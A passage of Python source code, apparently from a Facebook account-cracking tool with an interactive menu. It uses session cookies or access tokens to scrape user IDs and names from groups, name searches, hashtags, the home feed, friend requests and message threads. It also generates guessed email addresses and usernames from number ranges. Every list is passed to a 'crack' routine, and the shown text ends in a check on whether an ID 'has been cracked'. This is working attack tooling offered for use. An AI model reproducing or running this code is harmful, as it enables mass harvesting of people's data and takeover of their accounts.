            print("%s [%s•%s] %sYOU JOIN %s%s%s GROUP"%(H,P,H,K,O,len(self.glist),P));print('%s [%s1%s] %sSEARCH ALL GROUPS JOIN'%(H,P,H,K));print('%s [%s2%s] %sSEARCH GROUPS BY NAME'%(H,P,H,K));print('%s [%s3%s] %sSEARCH GROUPS BY ID'%(H,P,H,K))
            while True:
                c=_cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K));print('%s '%(O))
                if c=="":continue
                elif c=="1":self.saya()
                elif c=="2":self.search()
                elif c=="3":self.manual()
                else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        else:print("%s [%s•%s] %sYOU DON'T JOIN ANY GROUP"%(H,P,H,K));self.manual()
    def saya(self):
        self.fl=(self.id)
        try:os.remove(self.fl)
        except:pass
        print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
        try: 
            url = "https://graph.facebook.com/me/groups?access_token={}".format(self.token)
            with _req_ses_ as ses_:
                data = ses_.get(url).json()
                for _azimvau_ in data["data"]:
                    try:self._grup_.append(_azimvau_["id"])
                    except:pass
            for _cici_ in self._grup_:
                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,P,_error_));_cici_cici_()
        except (KeyError,IOError):jalan('%s [%s!%s] %sCOOKIE INVALID'%(M,P,M,P));menu()
        except requests.exceptions.ConnectionError:jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));menu()
        except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
        except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def exec_grup_saya(self):
        global count
        with _req_ses_ as ses_:
            try:
                data = ses_.get(self.url_grup, cookies=self.cookies, headers=self.header).content;sop_dev = par(data, "html.parser");members = sop_dev.find("div", id="objects_container")
                for dev in members.find_all("table"):
                    user_ = dev["id"].replace("member_", "");nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
                    try:_azimvau_dapunta_(self.fl,'a+').write(str(user_)+"•"+str(nama_)+"\n").close()
                    except:pass
                print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
                if "See more" in str(sop_dev):url = sop_dev.find("a", string="See more")["href"];url_grup = "https://mbasic.facebook.com"+url;self.exec_grup_saya()
            except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari Grup Saya"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
            except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def manual(self):
        id=_cici_azimvau_("%s [%s•%s] %sENTER GROUP ID : "%(H,P,H,K))
        if id=="":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        else:
            r=bs4.BeautifulSoup(_req_get_("https://m.facebook.com/groups/"+id,headers=header_grup,cookies=self.cookies).text,"html.parser")
            if "no content" in r.find("title").text.lower():jalan('%s [%s!%s] %sPRIVATE GROUP / WRONG ID'%(M,P,M,P));menu()
            else:
                self.listed={"id":id,"name":r.find("title").text};self.f(id);print('%s '%(O));print("%s [%s•%s] %sNAME : %s"%(H,P,H,K,self.listed.get("name")));xd = _cici_azimvau_('%s [%s•%s] %sDump ID/Username? [i/u] : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
                if xd in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
                elif xd in ['i','I','1']:
                    try:self.dump_id("https://m.facebook.com/groups/"+id);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                elif xd in ['u','U','2']:
                    try:self.dump_username("https://m.facebook.com/groups/"+id);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,M,_error_));_cici_cici_()
                else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()    
    def search(self):
        whitelist=[];q=_cici_azimvau_('%s [%s•%s] %sNAME : '%(H,P,H,K)).lower()
        if q=='':self.search()
        else:
            for e,i in enumerate(self.glist):
                if q in i.get("name").lower():whitelist.append(i);print('%s [%s%s%s] %s%s'%(O,P,len(whitelist),O,P,i.get("name").replace(q,"%s"%(q))))
            if len(whitelist)==0:jalan('%s [%s!%s] %sPRIVATE GROUP OR WRONG ID'%(M,P,M,P));menu()
            else:self.choice(whitelist,q)
    def choice(self, whitelist,q):
        try:
            self.listed=whitelist[int(_cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K)))-int(1)];self.f(q);print('%s '%(O));print("%s [%s•%s] %sNAME : %s"%(H,P,H,K,self.listed.get("name")));xd = _cici_azimvau_('%s [%s•%s] %sDUMP/USERNAME? %s[%si%s/%su%s] : '%(H,P,H,K,Z,M,Z,H,Z));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
            if xd in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            elif xd in ['i','I','1']:
                try:self.dump_id("https://m.facebook.com/groups/"+self.listed.get("id"));print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,P,_error_));_cici_cici_()
            elif xd in ['u','U','2']:
                try:self.dump_username("https://m.facebook.com/groups/"+self.listed.get("id"));print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,P,_error_));_cici_cici_()
            else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
        except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,P,_error_));_cici_cici_()
    def f(self,id):
        self.fl=(id.replace(' ','_')+'.json')
        if self.fl=='':self.f()
        try:os.remove(self.fl)
        except:pass
        _azimvau_dapunta_(self.fl,"w").close()
    def dump_username(self, url):
        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
        for i in r.find_all("h3"):
            try:
                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
                    ogeh=i.find("a",href=True)
                    if "profile.php" in ogeh.get("href"):
                        a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _azimvau_dapunta_(self.fl).read():continue
                        else:_azimvau_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
                    else:
                        a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _azimvau_dapunta_(self.fl).read():continue
                        else:_azimvau_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text))
            except:continue
        for i in r.find_all("a",href=True):
            if "See More Posts" in i.text:
                while True:
                    try:self.dump_username("https://m.facebook.com/"+i.get("href"));break
                    except Exception as e:print('\r%s [%s!%s] %sREPEAT'%(M,P,M,M));continue
    def dump_id(self, url):
        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
        for i in r.find_all("h3"):
            try:
                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
                    ogeh=i.find("a",href=True)
                    if "profile.php" in ogeh.get("href"):
                        a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _azimvau_dapunta_(self.fl).read():continue
                        else:_azimvau_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
                    else:
                        a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _azimvau_dapunta_(self.fl).read():continue
                        else:_azimvau_dapunta_(self.fl,"a+").write("%s•%s\n"%(_get_id_(a),ogeh.text))
            except:continue
        for i in r.find_all("a",href=True):
            if "See More Posts" in i.text:
                while True:
                    try:self.dump_id("https://m.facebook.com/"+i.get("href"));break
                    except Exception as e:print('\r%s [%s!%s] %sMengulangi'%(M,P,M,P));continue


def _get_id_(username):
    url = "https://lookup-id.com/#"
    with _req_ses_ as dev:
        payload = {"fburl": "https://m.facebook.com/{}".format(username), "check": "Lookup"}
        if "facebook" in username:payload = {"fburl": username, "check": "Lookup"}
        data_dev = dev.post(url, data=payload).content;sop_ = par(data_dev, "html.parser");id_ = sop_.find("span", id="code");user_get_id = id_.text
        return user_get_id


def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : kurd'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
    for _name_ in __name__:_url_ = "https://mbasic.facebook.com/search/people/?q="+_name_;cari_nama(_file_,_azimvau_,_url_)
    _buka_file_ = _azimvau_dapunta_(_file_,'r').read().splitlines();print("\n%s [%s•%s] %sTOTAL ID : %s"%(H,P,H,K,str(len(_buka_file_))))
    return crack(_file_)
def cari_nama(_file_,_cookies_,_url_):
    _azimvau_dapunta_(_file_,"a+");_req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
    for _azimvau_dev_ in _req_ses_dev_.find_all("a",href=True):
        print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
        if "<img alt=" in str(_azimvau_dev_):
            if "home.php" in str(_azimvau_dev_["href"]):continue
            else:
                _str_dev_ = str(_azimvau_dev_["href"])
                if "profile.php" in _str_dev_:
                    _name_ = _azimvau_dev_.find("img").get("alt").replace(", profile picture","");_find_ = bs4.re.findall("/profile\.php\?id=(.*?)&",_str_dev_)
                    if len (_find_) !=0:
                        _user_ = "".join(_find_)
                        if _user_ in _azimvau_dapunta_(_file_).read():pass
                        else:_azimvau_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
                else:
                    _find_ = bs4.re.findall("/(.*?)\?",_str_dev_);_name_ = _azimvau_dev_.find("img").get("alt").replace(", profile picture","")
                    if len(_find_) !=0:
                        _user_="".join(_find_)
                        if _user_ in _azimvau_dapunta_(_file_).read():pass
                        else:_azimvau_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
        if "See More Results" in _azimvau_dev_.text:cari_nama(_file_,_cookies_,_azimvau_dev_["href"])


class dump_pesan:
    def __init__(self,_cookies_,_nama_,_id_):
        self.cookies = _cookies_;self.id = _id_;self.files = (_nama_+'.json').replace(" ","_");_azimvau_dapunta_(self.files,"w").close();self.dump("https://m.facebook.com/messages")
    def dump(self,url):
        _req_ses_dev_ = bs4.BeautifulSoup(_req_get_(url,headers=header_nama,cookies=self.cookies).text,"html.parser")
        for _dev_ in _req_ses_dev_.find_all("a",href=True):
            if "/messages/read" in _dev_.get("href"):
                _soup_ = bs4.re.findall("cid\.c\.(.*?)%3A(.*?)&",_dev_.get("href"))
                try:
                    for _user_ in list(_soup_.pop()):
                        if _user_ in self.id:continue
                        else:
                            if "Facebook user" in _dev_.text.lower():continue
                            _azimvau_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
                except Exception as e:continue
            if "See Older Messages" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
        _buka_file_ = _azimvau_dapunta_(self.files,'r').read().splitlines();print("\n%s [%s•%s] %sALL ID : %s"%(H,P,H,K,str(len(_buka_file_))))
        return crack(self.files)



def file():
	try:
		print("")
		xc = input('%s [%s•%s] %sFILE : %s'%(H,P,H,K,H))
		id = open(xc).read().splitlines()
		print('%s [%s•%s] %sALL ID : %s%s'%(H,P,H,O,H,len(id)))
		return crack(xc)
	except FileNotFoundError:
		print("%s [%s!%s] %sFILE NOT EXISTING"%(M,P,M,M))
		file()
		

def dump_email():
    print("%s [%s•%s] %sEXAMPLE : ahmadkurd819 "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
    if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,P));time.sleep(2);menu()
    print("%s [%s•%s] %sEXAMPLE : %sgmail.com"%(H,P,H,K,H));_domain_ = _cici_azimvau_("%s [%s•%s] %sENTER DOMAIN : "%(H,P,H,K)).lower()
    if '@' in _domain_:_domain_ = _domain_.split('@')[1]
    _limit_awal_ = int(_cici_azimvau_("%s [%s•%s] %sENTER STARING NUMBER : "%(H,P,H,K)));_limit_akhir_= int(_cici_azimvau_("%s [%s•%s] %sENTER ENDING NUMBER : "%(H,P,H,K)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
    exec_email(_query_,_domain_,_limit_awal_,_limit_akhir_,_file_)
def exec_email(__query__,_domain_,_limit_awal_,_limit_akhir_,_file_):
    _hitung_email_1_ = _limit_awal_+1;_hitung_email_2_ = _limit_awal_+1;_hitung_email_3_ = _limit_awal_+1;_hitung_email_full_ = _limit_awal_+1
    if ' ' in __query__:
        try:_query_1_ = __query__.split(' ')[0]
        except:pass
        try:_query_2_ = __query__.split(' ')[1]
        except:pass
        try:_query_3_ = __query__.split(' ')[2]
        except:pass
    elif '.' in __query__:
        try:_query_1_ = __query__.split('.')[0]
        except:pass
        try:_query_2_ = __query__.split('.')[1]
        except:pass
        try:_query_3_ = __query__.split('.')[2]
        except:pass
    elif '_' in __query__:
        try:_query_1_ = __query__.split('_')[0]
        except:pass
        try:_query_2_ = __query__.split('_')[1]
        except:pass
        try:_query_3_ = __query__.split('_')[2]
        except:pass
    elif '-' in __query__:
        try:_query_1_ = __query__.split('-')[0]
        except:pass
        try:_query_2_ = __query__.split('-')[1]
        except:pass
        try:_query_3_ = __query__.split('-')[2]
        except:pass
    else:
        try:_query_1_ = __query__
        except:pass
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s@%s'%(_query_1_,str(_hitung_email_1_),_domain_));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s@%s'%(_query_2_,str(_hitung_email_2_),_domain_));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s@%s'%(_query_3_,str(_hitung_email_3_),_domain_));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
                elif '_' in __query__:_query_ = __query__;nama = __query__.replace('_',' ')
                elif '-' in __query__:_query_ = __query__;nama = __query__.replace('-',' ')
                else:_query_ = __query__.replace(' ','');nama = __query__
                email = ('%s%s@%s'%(_query_,str(_hitung_email_full_),_domain_));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:
        jalan('%s [%s!%s] %sTHERE IS AN ERROR'%(M,P,M,M))
        time.sleep(2)
        menu()
    _buka_file_ = _azimvau_dapunta_(_file_,'r').read().splitlines()
    print("%s [%s•%s] %sTOTAL ID : %s%s"%(H,P,H,K,H,str(len(_buka_file_))))
    return crack(_file_)


def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %sahmadkurd871"%(H,P,H,K,H));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
    if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,M));time.sleep(2);menu()
    _limit_awal_ = int(_cici_azimvau_("%s [%s•%s] %sENTER STARTING NUMBER (EX: 1) : "%(H,P,H,P)));_limit_akhir_= int(_cici_azimvau_("%s [%s•%s] %sENTER ENDING NUMBER (EX: 1000): "%(H,P,H,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
    exec_username(_query_,_limit_awal_,_limit_akhir_,_file_)
def exec_username(__query__,_limit_awal_,_limit_akhir_,_file_):
    _hitung_email_1_ = _limit_awal_+1;_hitung_email_2_ = _limit_awal_+1;_hitung_email_3_ = _limit_awal_+1;_hitung_email_full_ = _limit_awal_+1
    if ' ' in __query__:
        try:_query_1_ = __query__.split(' ')[0]
        except:pass
        try:_query_2_ = __query__.split(' ')[1]
        except:pass
        try:_query_3_ = __query__.split(' ')[2]
        except:pass
    elif '.' in __query__:
        try:_query_1_ = __query__.split('.')[0]
        except:pass
        try:_query_2_ = __query__.split('.')[1]
        except:pass
        try:_query_3_ = __query__.split('.')[2]
        except:pass
    elif '_' in __query__:
        try:_query_1_ = __query__.split('_')[0]
        except:pass
        try:_query_2_ = __query__.split('_')[1]
        except:pass
        try:_query_3_ = __query__.split('_')[2]
        except:pass
    elif '-' in __query__:
        try:_query_1_ = __query__.split('-')[0]
        except:pass
        try:_query_2_ = __query__.split('-')[1]
        except:pass
        try:_query_3_ = __query__.split('-')[2]
        except:pass
    else:
        try:_query_1_ = __query__
        except:pass
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s'%(_query_1_,str(_hitung_email_1_)));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s'%(_query_2_,str(_hitung_email_2_)));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s'%(_query_3_,str(_hitung_email_3_)));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
                elif '_' in __query__:_query_ = __query__;nama = __query__.replace('_',' ')
                elif '-' in __query__:_query_ = __query__;nama = __query__.replace('-',' ')
                else:_query_ = __query__.replace(' ','');nama = __query__
                email = ('%s%s'%(_query_,str(_hitung_email_full_)));_azimvau_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:jalan('%s [%s!%s] %sTHERE IS AN ERROR'%(M,P,M,P));time.sleep(2);menu()
    _buka_file_ = _azimvau_dapunta_(_file_,'r').read().splitlines();print("%s [%s•%s] %sALL ID : %s%s"%(H,P,H,K,H,str(len(_buka_file_))))
    return crack(_file_)

### Dump ID Dari Hashtag
def hashtag(cookies):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER HASHTAG : '%(H,P,H,B));_url_dev_ = 'https://mbasic.facebook.com/hashtag/' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));exec_hashtag(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_hashtag(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_hashtag);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _azimvau_ in _cici_.find_all('a',href=True):
                if 'mbasic.facebook.com' in _azimvau_.get('href'):pass
                else:
                    if "profile.php" in _azimvau_.get('href'):
                        try:
                            _name_dev_ = _azimvau_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_azimvau_.get("href")))
                            if _name_dev_ in _buka_file_:pass
                            elif '/' in _id_dev_:pass
                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                        except:pass
                    else:
                        try:
                            _name_dev_ = _azimvau_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_azimvau_.get("href")))
                            if _name_dev_ in _buka_file_:pass
                            elif '/' in _id_dev_:pass
                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                        except:pass
            for _azimvau_ in _sop_dev_.find_all('a',href=True):
                if 'See More Results' in _azimvau_.text:url_dev = _azimvau_.get('href');exec_hashtag(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)


def beranda(cookies):
    _url_dev_ = 'https://mbasic.facebook.com/home.php';_file_ = 'beranda.json'
    try:os.remove(_file_)
    except:pass
    print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));exec_beranda(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_beranda(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _azimvau_ in _cici_.find_all('a',href=True):
                if "profile.php" in _azimvau_.get('href'):
                    try:
                        _name_dev_ = _azimvau_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_azimvau_.get("href")))
                        if _name_dev_ in _buka_file_:pass
                        elif '/' in _id_dev_:pass
                        else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                    except:pass
                else:
                    try:
                        _name_dev_ = _azimvau_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_azimvau_.get("href")))
                        if _name_dev_ in _buka_file_:pass
                        elif '/' in _id_dev_:pass
                        else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                    except:pass
            for _azimvau_ in _sop_dev_.find_all('a',href=True):
                if 'See More Stories' in _azimvau_.text:url_dev = 'https://mbasic.facebook.com/' + _azimvau_.get('href');exec_beranda(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)

def permintaan_pertemanan_masuk(cookies):
    _url_dev_ = 'https://mbasic.facebook.com/friends/center/requests';_file_ = 'friend_login.json'
    try:os.remove(_file_)
    except:pass
    print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));exec_permintaan_pertemanan_masuk(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_permintaan_pertemanan_masuk(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _azimvau_ in _sop_dev_.find_all('a',href=True):
            if '/friends/hovercard' in _azimvau_.get('href'):
                try:_name_dev_ = _azimvau_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_azimvau_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _azimvau_ in _sop_dev_.find_all('a',href=True):
            if 'See More' in _azimvau_.text:url_dev = 'https://mbasic.facebook.com/' + _azimvau_.get('href');exec_permintaan_pertemanan_masuk(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)


def permintaan_pertemanan_keluar(cookies):
    _url_dev_ = 'https://mbasic.facebook.com/friends/center/requests/outgoing';_file_ = 'friend_out.json'
    try:os.remove(_file_)
    except:pass
    print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));exec_permintaan_pertemanan_keluar(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_permintaan_pertemanan_keluar(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _azimvau_ in _sop_dev_.find_all('a',href=True):
            if '/friends/hovercard' in _azimvau_.get('href'):
                try:_name_dev_ = _azimvau_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_azimvau_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _azimvau_ in _sop_dev_.find_all('a',href=True):
            if 'See More' in _azimvau_.text:url_dev = 'https://mbasic.facebook.com/' + _azimvau_.get('href');exec_permintaan_pertemanan_keluar(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Cek Target Crack
def cek_target_crack_(_id_):
    open('list_id.txt','a+')
    try:
        _cek_ = open('list_id.txt','r').read()
        if _id_ in _cek_:
            if _id_ == 'me':pass
            else:
                _cokzz_ = _cici_azimvau_('%s [%s!%s] %sID HAS BEEN CRACKED, CONTINUE? [Y/n] : '%(M,P,M,P))
                if _cokzz_ in ['',' ']:pass
